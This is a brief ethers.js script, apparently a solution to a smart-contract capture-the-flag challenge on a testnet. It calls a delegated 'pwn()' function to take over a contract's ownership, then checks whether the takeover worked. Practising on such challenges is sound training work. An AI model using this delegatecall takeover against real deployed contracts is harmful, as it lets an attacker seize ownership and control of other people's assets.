const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [
    "function pwn() public", // this function is delegated

    "function owner() view returns (address)", // this function is from the original contract
];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(account, contract)) {
        console.log('already solved');
        return;
    }

    console.log('calling pwn()...');
    const pwnTx = await contract.connect(account).pwn({ gasLimit: 1000000 });
    await pwnTx.wait();

    console.log('checking contract ownership...');
    if (await isSolved(account, contract)) {
        console.log('solved');
    } else {
        console.log('could get contract ownership. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(account, contract) {
    const owner = await contract.owner();
    return owner == account.address;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
